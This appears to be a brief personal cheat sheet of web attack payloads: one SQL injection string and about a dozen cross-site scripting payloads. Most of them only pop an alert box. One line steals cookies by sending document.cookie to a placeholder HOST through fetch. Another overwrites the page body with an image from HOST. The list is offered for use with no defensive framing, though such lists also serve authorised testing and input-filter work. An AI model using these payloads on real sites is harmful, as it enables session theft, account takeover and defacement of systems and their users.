## This will be a collection of XSS JavaScript Payloads I have used

SQL payload
' OR 1='1




XSS Payloads
</script><script>alert(1)</script>
"><h1>test</h1>
'+alert(1)+'
"onmouserover="alert(1)
http://"onmouseover="alert(1)
<body onload=alert(1)>

<img src=1 onerror=alert(1)>

<svg onload=alert(1)>

<x onmouseover=alert(1)>
<object data=javascript:alert(1)>

<script>alert(document.domain)</script>


<svg onload=fetch('//HOST/?cookie='+document.cookie)>

<svg onload="document.body.innerHTML='<img src=//HOST/IMAGE>'">


